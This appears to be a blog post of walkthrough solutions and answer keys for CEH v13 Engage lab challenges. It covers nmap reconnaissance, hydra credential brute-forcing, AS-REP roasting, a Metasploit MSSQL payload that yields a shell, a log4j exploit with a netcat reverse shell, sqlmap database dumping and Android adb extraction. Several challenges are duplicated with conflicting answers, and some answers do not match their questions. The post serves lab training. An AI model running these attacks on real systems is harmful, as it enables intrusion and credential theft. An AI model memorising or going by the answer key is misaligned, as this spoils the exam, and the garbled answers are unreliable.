---
title: "CEH v13 Engage"
description: "CEH v13 Engage solutions"
date: 2025-06-06T10:00:00+05:30
categories:
  - linux
  - hacking
tags:
  - linux
  - sudo
  - privilege escalation
  - linux security
  - pentesting
---
# CEH v13 Engage
## CEH Engage Part 1
### Challenge 1:
An attacker conducted footprinting on a web application and saved the resulting report Dumpster.xlsx in the documents folder of EH Workstation-1. Your task is to analyze this report and identify the hostname associated with the IP address 173.245.59.176. *(Format: aaaaa.aa.aaaaaaaaaa.aaa)*{: .highlight}

```bash
open the Dumpster.xlsx file and filter given ip
```
Answer: `henry.ns.cloudflare.com`

### Challenge 2:
Identify the number of live machines excluding the gateway in 192.168.10.0/24 subnet. *(Format: N)*{: .highlight}

```bash
nmap -sn 192.168.10.0/24 (Exclude first ip address)
```
Answer: `5`

### Challenge 3:
Identify the IP address of a Linux-based machine with port 22 open in the target network 192.168.10.0/24 *(Format: NNN.NNN.NN.NNN)*{: .highlight}.

```bash
nmap -p 22 192.168.10.0/24 --open
```
Answer: `192.168.10.111`

### Challenge 4:
Find the IP address of the Domain Controller machine in 192.168.0.0/24 *(Format: NNN.NNN.N.NNN)*{: .highlight}.

```bash
nmap -p 53 192.168.0.0/24 --open
```
Answer: `192.168.0.222`

### Challenge 5:
Perform a host discovery scanning and identify the NetBIOS_Domain_Name of the host at 192.168.0.222. *(Format: AAAAA.AAA)*{: .highlight}

```bash
nmap -sV -A 192.168.0.222
```
Answer: `SKILL.CEH`

### Challenge 6:
Perform an intense scan on 192.168.0.222 and find out the DNS_Tree_Name of the machine in the network. *(Format: AAAAA.AAA.aaa)*{: .highlight}

```bash
nmap -sV -A 192.168.0.222
```
Answer: `SKILL.CEH.com`

### Challenge 7:
While performing a security assessment against the CEHORG network, you came to know that one machine in the network is running OpenSSH and is vulnerable. Identify the version of the OpenSSH running on the machine. Note: Target network 192.168.10.0/24. *(Format: N.NaN)*{: .highlight}

```bash
nmap  -p  22  -sV 192.168.10.0/24 --open
```
Answer: `8.9p1`

### Challenge 8:
During a security assessment, it was found that a server was hosting a website that was susceptible to blind SQL injection attacks. Further investigation revealed that the underlying database management system of the site was MySQL. Determine the machine OS that hosted the database. Note: Target network 172.30.10.0/24 *(Format: Aaaaaa)*{: .highlight}

```bash
nmap -p 3306 172.30.10.0/24 --open  ( you find the ip of host)
nmap -A 172.30.10.99
```
Answer: `Ubuntu`

### Challenge 9:
Perform an intense scan on target subnet 192.168.10.0/24 and determine the IP address of the machine hosting the MSSQL database service. *(Format: NNN.NNN.NN.NNN)*{: .highlight}

```bash
nmap -p 1433 192.168.10.0/24
```
Answer: `192.168.10.144`

### Challenge 10:
Perform a DNS enumeration on www.certifiedhacker.com and find out the name servers used by the domain. *(Format: aaN.aaaaaaaa.aaa, aaN.aaaaaaaa.aaa)*{: .highlight}
```bash
dig NS certifiedhacker.com   (or) use whois
```
Answer: `ns1.bluehost.com, ns2.bluehost.com`

### Challenge 11:
Find the IP address of the machine running SMTP service on the 172.30.10.0/24 network. *(Format: NNN.NN.NN.NNN)*{: .highlight}

```bash
nmap -p 25 172.30.10.0/24 --open
```
Answer: `172.30.10.200`

### Challenge 12:
Perform an SMB Enumeration on 172.30.10.200 and check whether the Message signing feature is required. Give your response as Yes/No.
```bash
nmap -p 445 -sV -A 172.30.10.200
```
Answer: `No`

### Challenge 13:
Perform a vulnerability assessment on the 2023 CWE Top 25 most dangerous software vulnerabilities and determine the weakness ID of the last entry on the list. *(Format: NNN)*{: .highlight}
```bash
- Search for ( 2023 CWE Top 25 most dangerous software vulnerabilities ) in google.
- Goto [ https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html ]
- Enter last 25th id in list
```
Answer: `276`

### Challenge 14:
Perform vulnerability scanning for the Linux host in the 192.168.10.0/24 network using OpenVAS and find the QoD percentage of vulnerabilitiy with severity level as medium. *(Format: NN)*{: .highlight}
```bash
- docker run -d -p 443:443 --name openvas mikesplain/openvas
- Add task for given network.
- Goto results after the scan
```
Answer: `70`

### Challenge 15:
Perform a vulnerability scan on the host at 192.168.10.144 using OpenVAS and identify any FTP-related vulnerability. *(Format: AAA Aaaaaaaaa Aaaaaaaaa Aaaaa)*{: .highlight}
```bash
- docker run -d -p 443:443 --name openvas mikesplain/openvas
- Add task for given network.
- Goto results after the scan
- Filter ftp
```
Answer: `FTP Unencrypted Cleartext Login`

## CEH Engage Part 2
### Challenge 1:
You are assigned to perform brute-force attack on a linux machine from 192.168.10.0/24 subnet and crack the FTP credentials of user nick. An exploitation information file is saved in the home directory of the FTP server. Determine the Vendor homepage of the FTP vulnerability specified in the file. *(Format: aaaaa://aaa.aaaaaaaa.aaa/)*{: .highlight}
```bash
- nmap -p 22 192.168.10.0/24 --open (you found 4 ips)
- ping found ips to know which is linux with ttl value <= 64
- hydra -l nick -P password.txt ftp://192.168.10.111
- Password found is apple
- ftp 192.168.10.111
- login ftp with that password 
- get 520125.py file and open to get vendor homepage
```
Answer: `https://www.crushftp.com/`

### Challenge 2:
An intruder performed network sniffing on a machine from 192.168.10.0/24 subnet and obtained login credentials of the user for moviescope.com website using remote packet capture in wireshark. You are assigned to analyse the Mscredremote.pcapng file located in Downloads folder of EH Workstation-1 and determine the credentials obtained. *(Format: aaaa/aaaaa)*{: .highlight}
```bash
- open Mscredremote.pcapng file in wireshark
- filter http.request.method == POST
- extend HTML Form Url
```
Answer: `kety/apple`

### Challenge 3:
You are assigned to analyse a packet capture file ServerDoS.pcapng located in Downloads folder of EH Workstation-2 machine. Determine the UDP based application layer protocol which attacker employed to flood the machine in targeted network.
Note: Check for target Destination port. *(Format: Aaaaa Aaaaaaa Aaaaaaaa)*{: .highlight}

```bash
- open file in wireshark you will found dest port is 26000
- search 26000 udp in google
```
Answer: `Quake Network Protocol`
 
### Challenge 4:
A severe DDoS attack is occurred in an organization, degrading the performance of a ubuntu server machine in the SKILL.CEH network. You are assigned to analyse the DD_attack.pcapng file stored in Documents folder of EH workstation -2 and determine the IP address of the attacker trying to attack the target server through UDP. *(Format: NNN.NNN.NN.NNN)*{: .highlight}

```bash
- Filter for UDP
```
Answer: `192.168.10.144`

### Challenge 5:
You are assigned to analyse PyD_attack.pcapng file stored in Downloads folder of EH Workstation -2 machine. Determine the attacker IP machine which is targeting the RPC service of the target machine. *(Format: NNN.NN.NN.NN)*{: .highlight}

```bash
- open wireshark
- filter tcp.port == 135
- you find one ip with dst port 135
```
Answer: `172.30.10.99`

### Challenge 6:
An incident handler identified severe DDoS attack on a network and provided report using Anti-DDoS Guardian tool. You are assigned to analyse the reports submitted by the IH team which are stored in "C:\Users\Admin\Documents\Anti-DDoS" directory of the EH Workstation-1 and determine the attacker IP which has transmitted more number of packets to the target machine. *(Format: NNN.NNN.NN.NNN)*{: .highlight}

```bash
- open report export.txt file
- find remote ip with higher no of packets
```
Answer: `172.30.10.99`

### Challenge 7:
You are assigned to analyse the domain controller from the target subnet and perform AS-REP roasting attack on the user accounts and determine the password of the vulnerable user whose credentials are obtained. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. *(Format: `aNaaN*NNN`)*{: .highlight}

```bash
- python3 GetNPUsers.py SKILL.com/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
```
Answer: `admin*admin`

### Challenge 8:
You are assigned to analyse the domain controller from the target subnet and perform AS-REP roasting attack on the user accounts and determine the password of the vulnerable user whose credentials are obtained. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. *(Format: `aNaaN*NNN`)*{: .highlight}

```bash
- python3 GetNPUsers.py SKILL.com/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
- copy the hash from output and paste in a txt file a.txt
- john --wordlist=rockyou.txt ~/a.txt
```
Answer: `admin*admin`

### Challenge 9:
You are assigned to analyse the domain controller from the target subnet and perform AS-REP roasting attack on the user accounts and determine the password of the vulnerable user whose credentials are obtained. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. *(Format: `aNaaN*NNN`)*{: .highlight}

```bash
- python3 GetNPUsers.py SKILL.com/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
- copy the hash from output and paste in a txt file a.txt
- john --wordlist=rockyou.txt ~/a.txt
```
Answer: `c3ll0@123`
 
### Challenge 10:
A client machine under the target domain controller has a misconfigured SQL server vulnerability. Your task is to exploit this vulnerability, retrieve the MSS.txt file located in the Public Downloads folder on the client machine and determine its size in bytes as answer. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. *(Format: N)*{: .highlight}

```bash
1.	scan all networks with open port 1433 | nmap -p 1433 192.168.10.0/24 --open
2.	Try bruteforce all ips with open 1433 port
3.	hydra -U username.txt -P password.txt 192.168.10.144 mssql
4.	user = Server_mssrv  and Password = Spidy
5.	 python3 /Ad-tools/impacket/examples/mssqlclient.py SKILL.com/Server_mssrv:Spidy@192.168.10.144  -port 1433
6.	Then type this [ SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell'; ]
7.	type exit.
8.	Goto msfconsole
9.	▪ use exploit/windows/mssql/mssql_payload ▪ set RHOST 192.168.10.144 ▪ set USERNAME Server_mssrv ▪ set PASSWORD Spidy ▪ set DATABASE msdb
10.	Exploit
11.	In meterpreter, type shell
12.	type cd /Users/Public/Downloads/  and type dir
13.	note the size of MSS.txt
```
Answer: `7` *(Note: You can also crack ftp but this is the correct method to pass exam.)*{: .highlight-info}

### Challenge 10:
You are assigned to crack RDP credentials of user Maurice from the target subnet 192.168.10.0/24 and determine the password as answer. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. *(Format: Aaaaaaa@NNNN)*{: .highlight}

```bash
- nmap -p 3389 192.168.10.0/24 --open
- hydra -l Maurice -P rockyou.txt 192.168.10.222 rdp
```
Answer: `Maurice@123`

### Challenge 11:
You are assigned to crack RDP credentials of user Maurice from the target subnet 192.168.10.0/24 and determine the password as answer. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. *(Format: Aaaaaaa@NNNN)*{: .highlight}

```bash
- nmap -p 3389 192.168.10.0/24 --open
- hydra -l Maurice -P rockyou.txt 192.168.10.222 rdp
```
Answer: `Maurice@123`

### Challenge 12:
You are assigned to crack RDP credentials of user Maurice from the target subnet 192.168.10.0/24 and determine the password as answer. Note: use Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. *(Format: Aaaaaaa@NNNN)*{: .highlight}

```bash
- nmap -p 3389 192.168.10.0/24 --open
- hydra -l Maurice -P rockyou.txt 192.168.10.222 rdp
```
Answer: `Pumpkin@1234`

### Challenge 13:
You are assigned to perform malware scanning on a malware file Tools.rar stored in Downloads folder of EH workstation-2 machine and determine the last four digits of the file’s SHA-256 hash value. *(Format: `aNNN`)*{: .highlight}

```bash
sha256sum Tools.rar
```
Answer: `d282`

### Challenge 14:
You are assigned to monitor a suspicious process running in a machine whose log file Logfile.PML is saved in Pictures folder of the EH Workstation -2. Analyse the logfile and determine the Parent PID of the malicious file H3ll0.exe process from the log file. *(Format: `NNNN`)*{: .highlight}

```bash
- Copy that log file to windows
- Install procmon.exe in the malware analysis folder
- open that file in procmon
- Search H3II0 and double click to open. now you find the Paren PID
```
Answer: `6952`

### Challenge 15:
You are tasked with analyzing the ELF executable file named Tornado.elf, located in the Downloads folder of EH Workstation-2. Determine the entropy value of the file up to two decimal places. *(Format: `N*NN`)*{: .highlight}

```bash
- Copy that file to windows
- open that file with DIE tool inside the static malware analysis folder
- Click Entropy button to see value
```
Answer: `2.87`

### Challenge 16:
You are assigned to scan the target subnets to identify the remote packet capture feature that is enabled to analyse the traffic on the target machine remotetly. Scan the target subnets and determine the IP address using rpcap service. *(Format: `NNN.NNN.NN.NNN`)*{: .highlight}

```bash
- nmap -p 2002 192.168.10.0/24
```
Answer: `192.168.10.144`

### Challenge 17:
An insider attack occurred in an organization and the confidential data regarding an upcoming event is sniffed and encrypted in a image file stealth.jpeg stored in Desktop of EH Workstation -2 machine. You are assigned to extract the hidden data inside the cover file using steghide tool and determine the tender quotation value. (Use azerty@123 for passphrase) *(Format: `NNNNNNN`)*{: .highlight}

```bash
- steghide extract -sf stealth.jpg
```
Answer: `192.168.10.144`

### Challenge 18:
An insider attack occurred in an organization and the confidential data regarding an upcoming event is sniffed and encrypted in a image file stealth.jpeg stored in Desktop of EH Workstation -2 machine. You are assigned to extract the hidden data inside the cover file using steghide tool and determine the tender quotation value. (Use azerty@123 for passphrase) *(Format: `NNNNNNN`)*{: .highlight}

```bash
- steghide extract -sf stealth.jpg
- open hidden.txt
```
Answer: `3965222`

### Challenge 19:
Perform vulnerability search using searchsploit tool and determine the path of AirDrop 2.0 vulnerability. *(Format: `aaaaaaa/aaa/NNNNN.a`)*{: .highlight}

```bash
Searchsploit AirDrop 2.0
```
Answer: `android/dos/46445.c`
## CEH Engage Part 3
### Challenge 1:
An attacker tried to perform session hijacking on a machine from 172.30.10.0/24 subnet. An incident handler found a packet capture file $_Jack.pcapng obtained from the victim machine which is stored in Documents folder of EH Workstation -1. You are assigned to analyse the packet capture file and determine the IP of the victim machine targeted by the attacker. *(Format: NNN.NN.NN.NNN)*{: .highlight}
```bash
- open file in wireshark
- you can easily find the victim ip
```
Answer: `172.30.10.200`

### Challenge 2:
An attacker tried to intercept a login session by intercepting the http traffic from the victim machine. The security analyst captured the traffic and stored it in Downloads folder of EH Workstation -1 as Intercep_$niffer.pcapng. Analyse the pcap file and determine the credentials captured by the attacker. *(Format: aaa/aaaa)*{: .highlight}
```bash
- Open file in wireshark
- filter http.request.method == POST 
- search for post login.aspx in list and extend the HTML Form
```
Answer: `lee/test`

### Challenge 3:
A honeypot has been set up on a machine within the 192.168.10.0/24 subnet to monitor and detect malicious network activity. Your task is to analyze the honeypot log file, cowrie.log, located in the Downloads folder of EH Workstation -2, and determine the attacker IP trying to access the target machine. *(Format: NNN*NN*NN*NN)*{: .highlight}
```bash
- Open file in pluma
- Search for ip with multiple login attemps
```
Answer: `172.30.10.99`

### Challenge 4:
Conduct a footprinting analysis on the target website www.certifiedhacker.com to identify the web server technology used by the site. *(Format: Aaaaaa)*{: .highlight}
```bash
- whatweb certifiedhacker.com
```
Answer: `Apache`

### Challenge 5:
You’re a cybersecurity investigator assigned to a high-priority case. Martin is suspected of engaging in illegal crypto activities, and it’s believed that he has stored his crypto account password in a file named $ollers.txt. Your mission is to crack the SSH credentials for Martin’s machine within the 192.168.10.0/24 subnet and retrieve the password from the $ollers.txt file. (Hint: Search in the folders present on the Desktop to find the target file) *(Format: `aNaa**NNNNNAA*`)*{: .highlight}
```bash
- nmap -p 22 192.168.10.0/24 --open
- hydra -l Martin -P password.txt 192.168.10.101
- Password: qwerty1234
- ssh Martin@192.168.10.101   enter password and get the file
```
Answer: `i2tr&^72546HJ*`

### Challenge 6:
Attackers have identified a vulnerable website and stored the details of this website on one of the machines within the 192.168.10.0/24 subnet. As a cybersecurity investigator you have been tasked to crack the FTP credentials of user nick and determine the ID of the domain. The information you need has been gathered and stored in the w_domain.txt file. *(Format: NNNNNNNNNN)*{: .highlight}
```bash
- Use same procedure in Enage 2 **Challenge** 1 (ftp 192.168.10.111  and password in apple)
- get W_domain.txt
```
Answer: `7867721010`

### Challenge 7:
You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer. *(Format: `Aa*aaNNNN`)*{: .highlight}
```bash
- First find the ip hosting website in port 8080 using nmap. Then do further steps
- In home execute 
- tar -xf jdk-8u202-linux-x64.tar.gz
- mv jdk1.8.0_202 /usr/bin
- cd log4j-shell-poc
- pluma poc.py
- Update the JDK Path in the Poc.py file
- Change Line no: 62, replace jdk1.8.0_20/bin/javac with "/usr/bin/jdk1.8.0_202/bin/javac"
- Change Line no: 87, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
- Change Line no: 99, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
- execute this in seperate terminal [ nc -lvp 9001]
- python3 poc.py --userip {ip of attacker pc} --webport 8080 --lport 9001
- Copy the [send this : value to be copied] from the output of previous command
- paste in username box and type any password in password box, click login
- Reverse shell connected in separate terminal where nc is listening
- type cat RootFlag.txt to view answer
- (If not connect to reverse shell reload the website and check the path and try again )
```
Answer: `Ch@mp2022`

### Challenge 8:
You are a penetration tester assigned to a new task. A list of websites is  stored in the webpent.txt file on the target machine with the IP address 192.168.10.101. Your objective is to find the Meta-Author of the website that is highlighted in the list. (Hint: Use SMB service) *(Format: AA-Aaaaaaa)*{: .highlight}
```bash
- Connect to the ip with password found in **Challenge** 5
- get file from music folder of user Martin
- whatweb "url"
```
Answer: `EC-Council`

### Challenge 9:
You have recently joined GoodShopping Inc. as a web application security administrator. Eager to understand the security landscape of the company’s website, www.goodshopping.com, you decide to investigate the security updates that have been made over time. Your specific task is to identify the attack category of the oldest Common Vulnerabilities and Exposures (CVEs) affected the website. *(Format: `aaaaa*aaaa aaaaaaaaaa (AAA)`)*{: .highlight}
```bash
- I found manually you can use Owasp zap or open vas or vega to confirm 
```
Answer: `cross-site scripting (XSS)`

### Challenge 10:
You are a web penetration tester hired to assess the security of the website www.goodshopping.com. Your primary task is to identify the type of security policies is missing to detect and mitigate Cross-Site Scripting (XSS) and SQL Injection attacks. *(Format: Aaaaaaa Aaaaaaaa Aaaaaa)*{: .highlight}
```bash
- Run Atomated scan with OWASP ZAP
```
Answer: `Content Security Policy`

### Challenge 11:
You are part of a cybersecurity team investigating an internal website that has been copied from a legitimate site without authorization. One of your teammates, acting as a spy, has scanned the website using a smart scanner within the subnet 192.168.10.0/24. Your task is to identify the number of Directory Listing of Sensitive Files on this website. The report, named w_report.pdf, is available on the target machine.(Hint: He remembered the OS as Windows Server 19 while scanning the website) *(Format: NN)*{: .highlight}  
```bash
- Use nmap to find Windows server 2019 inside 192.168.10.0/24 and brutefore that ip
- hydra -L user.txt -P rockyou.txt 192.168.10.144 ftp
- username: Parker and Password: Passw0rd@1234
- Access ftp and get w_report.txt
- open the report and read the site address
- Scan that website with Smart Scanner takes upto 30 min
- Scroll results to see Directory Listing of Sensitive Files.
- It shows 37 Approx but the answer is +/-1
  ```
Answer: `36`

### Challenge 12:
Perform a bruteforce attack on www.cehorg.com and find the password of user adam. *(Format: aaaaaaNNNN)*{: .highlight}
```bash
- wpscan --url http://www.cehorg.com/wp-login.php -U adam -P password.txt
- use password list in desktop
```
Answer: `orange1234`

### Challenge 13:
As a cybersecurity analyst, your task is to identify potential vulnerabilities on the moviescope.com website. Your manager has requested a specific number of risk categories. The required HTML file is located on EH Workstation 1. *(Format: N)*{: .highlight}
```bash
- Open html file inside videos folder
- count the no of risk with value 1
```
Answer: `3`

### Challenge 14:
Perform a SQL Injection attack on www.moviescope.com and find out the number of users available in the database. *(Format: N)*{: .highlight}
```bash
- Use credentials found in **Challenge** 2 to login.
- Copy the cookie value of user session lee in inspect element console, type document.cookie
- sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --dbs
- sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables
- sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump
```
Answer: `5`

### Challenge 15:
Perform a SQL Injection vulnerability scan on the target website www.moviescope.com and determine the WASC ID for SQL Injection *(Format: NN)*{: .highlight}
```bash
- Search for WASC ID for SQL Injection in google
```
Answer: `19`

## CEH Engage Part 4
### Challenge 1:
An employee's mobile device within CEHORG has been compromised, leading to an encrypted message BCtetx.txt being placed on the Android operating system. The password needed to decrypt the file is saved on EH-workstation-1. As an ethical hacker, your task is to decrypt the file using the password and input the extracted information. (note: the password file pawned.txt is stored in documents folder). *(Format: `*aaaaAN*NaN`)*{: .highlight}
```bash
- scan for open port 5555 in nmap
- adb connect 192.168.10.121
- adb pull /sdcard
```
Answer: `orange1234`

### Challenge 2:
A compromised Android device is suspected of containing malicious applications. As an ethical hacker, you are tasked with identifying and extracting all installed APK files. Within these APKs, you must locate and extract a specific CRC value ends with "614c" . This CRC value is believed to be a crucial component of a larger security breach investigation. Determine the complete CRC value as answer. *(Format: NNaaNNNa)*{: .highlight}
```bash
- scan for open port 5555 in nmap
- adb connect 192.168.10.121
- adb pull /sdcard
- find .txt file and copy to windows
- open with BCtext encoder and decrypt with given password
```
Answer: `(ryptD3(0d3`

### Challenge 3:
A compromised Android device is suspected of containing malicious applications. As an ethical hacker, you are tasked with identifying and extracting all installed APK files. Within these APKs, you must locate and extract a specific CRC value ends with "614c" . This CRC value is believed to be a crucial component of a larger security breach investigation. Determine the complete CRC value as answer. *(Format: NNaaNNNa)*{: .highlight}
```bash
- cd Phonesploit
- python phonesploit.py
- type 1 and enter ip address (192.168.10.121)
- type n 2 times and press 36, then press 2 and give some path
- now type crc32 path to apk
```
Answer: `53ac614c`

### Challenge 4:
A ZIP archive encompassing redundant images of a physical signature has been compromised signature.zip and stored in Documents folder of EH Workstation-1 machine. Your role as an ethical hacker involves a forensic examination of the archive's contents to pinpoint the image file associated with an MD5 hash value ends with sequence "24CCB". Determine the original signature file name as answer. *(Format: `aN*aaa`)*{: .highlight}
```bash
- Extract the zip and use MD5 calculator
```
Answer: `k4.png`

### Challenge 5:
As a cybersecurity analyst, you are investigating a potential phishing campaign targeting Ruby, an employee at a local tech company. You have access to Ruby’s call log from the past few days, stored on an Android device within the target subnet 192.168.10.0/24. Identify the call in the log that is most likely a phishing attempt and provide the suspected phone number. *(Format: `+N (NNN) NNN-NNNN`)*{: .highlight}
```bash
- Open call log file inside the sdcard/call we pulled in previous **Challenge**
- see suspect log
```
Answer: `+1 (555) 678-9012`

### Challenge 6:
An employee's mobile device has reportedly been compromised and is suspected of being used to launch a Denial of Service (DoS) attack against one of the company's internal servers. Your assignment is to conduct a thorough analysis of the network capture file "And_Dos.pcapng" located in the Documents directory of EH workstation-2 machine and identify the severity level/potential impact of the attack performed. (perform deep down Expert Info analysis). *(Format: `Aaaaaaa`)*{: .highlight}
```bash
- Open file in wireshark and Goto Analyze -> Expert Information
```
Answer: `Warning`

### Challenge 7:
CEHORG manages multiple IoT devices and sensors to oversee its supply chain fleet. You are tasked with examining the file "MQTT.pcapng," located in the Home directory of the EH Workstation - 2 machine. Analyze the packet containing the "High_humidity" message and determine the alert percentage specified in the message. *(Format: NN)*{: .highlight}
```bash
- Open file in wireshark and filter mqtt
- extend mqtt and right click -> copy as printable text and see clipboard for answer
```
Answer: `50`

### Challenge 8:
An attacker had sent a file cryt-128-06encr.hex containing ransom file password, which is located in documents folder of EH-workstation-2. You are assigned a task to decrypt the file using cryp tool. Perform cryptanalysis, Identify the algorithm used for file encryption and hidden text. Note: check filename for key length and hex characters. *(Format: `Aaaaaaa/**aa**aA*a`)*{: .highlight}
```bash
- Copy file to windows and open with cryptool
- You need to try all algorithms with 128 bit key length with key 06
- Goto Encrypt/Decrypt -> Symmetric (Modern) -> Further Algorithms -> Twofish
- Select 128 as key length and put key as 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06
```
Answer: `Twofish/@!ph@|tE*t`

### Challenge 9:
A VeraCrypt volume file "MyVeracrypt" is stored on the Document folder of the EH Workstation – 1 machine. You are an ethical hacker working with CEHORG; you have been tasked to decrypt the encrypted volume and determine the number of files stored in the volume folder. (Hint: Password: veratest). *(Format: N)*{: .highlight}
```bash
- Open vercrypt and choose Myveracrypt file
- Select volume to mount and click mount
- Enter the password. And go to the volume in File explorer
```
Answer: `4`

### Challenge 10:
An ex-employee of CEHORG is suspected of performing an insider attack. You are assigned a task to retrieve the contacts dump from the employee's Android phone. Using PhoneSploit, find the country code of the contact named "Maddy." (Note: Use option 'N' in PhoneSploit for next page.). *(Format: NN)*{: .highlight}
```bash 
- cd Phonesploit
- python3 phonesploit.py
- type 1 and enter ip address (192.168.10.121)
- type n 2 times and press 34, then press 2 and give some path
- now open the extracted file to find answer
```
Answer: `61`

### Challenge 11:
CEHORG manages multiple IoT devices and sensors to oversee its supply chain fleet. You are tasked with examining the file "MQTT.pcapng," located in the Home directory of the EH Workstation - 2 machine. Analyze the packet containing the "High_temperature" message and determine the topic length . *(Format: NN)*{: .highlight}
```bash
- Open file with wireshark and filter mqtt
- Search for publish message and expand to get answer
```
Answer: `16`

### Challenge 12:
An ex-employee of CEHORG is suspected to be performing insider attack. You are assigned a task to attain KEYCODE-5 used in the employees' mobile phone. Note: use option N in PhoneSploit for next page. *(Format: `Aaaaa*Aaaaaa`)*{: .highlight}
```bash
- cd Phonesploit
- python phonesploit.py
- type n 2 times and press 39
```
Answer: `Power Button`

### Challenge 13:
An employee in CEHORG has secretly acquired Confidential access ID through an application from the company. He has saved this information on the Music folder of his Android mobile phone. You have been assigned a task as an ethical hacker to access the file and delete it covertly. Enter the account information present in the file. Note: Only provide the numeric values in the answer field. *(Format: NNNNNNNN)*{: .highlight}
```bash
- scan for open port 5555 in nmap
- adb connect 192.168.10.121
- adb pull /sdcard
- find .txt file and read
```
Answer: `80099889`

### Challenge 14:
An attacker has hacked an employee's Android device at CEHORG and initiated a LOIC attack from the device. As an ethical hacker, you have obtained a screenshot of the attack using a background application. Retrieve the screenshot of the attack using PhoneSploit from the compromised mobile device and determine the number of HTTP packets sent per second. *(Format: NN)*{: .highlight}
```bash
- scan for open port 5555 in nmap
- adb connect 192.168.10.121
- adb pull /sdcard
- find image file and open
```
Answer: `23`

### Challenge 15:
You have received a folder named "Archive" from a vendor. You suspect that someone might have tampered with the files during transmission. The Original hashes of the files have been sent by the sender separately and are stored in a file named FileHashes.txt stored in the Document folder in the "EH Workstation – 2" machine. Your task is to check the integrity of the files by comparing the MD5 hashes. Compare the hash values and determine the file name that has been tampered with. Note: Exclude the file extension in the answer field. The answer is case-sensitive. *(Format: Aaaaaa)*{: .highlight}
```bash
- Copy files to windows
- Add the Archive folder to the MD5 calculator application
- Compare with filehashes.txt
```
Answer: `Quotes`

### Challenge 16:

A VeraCrypt volume file "secret" is stored on the Document folder in the EH Workstation – 2 machine. You are an ethical hacker working with CEHORG; you have been tasked to decrypt the encrypted volume and determine the number of files stored in the volume. (Hint: Password: test). *(Format: N)*{: .highlight}

```bash
Just copy the secret file in parrot to windows in any way like smb or apache server. 
Now open veracrypt in windows already installed in windows. 
Select the secret file, then choose volume to mount and enter password (test). 
Now go to the volume mounted and count files. 
```
Answer: `6`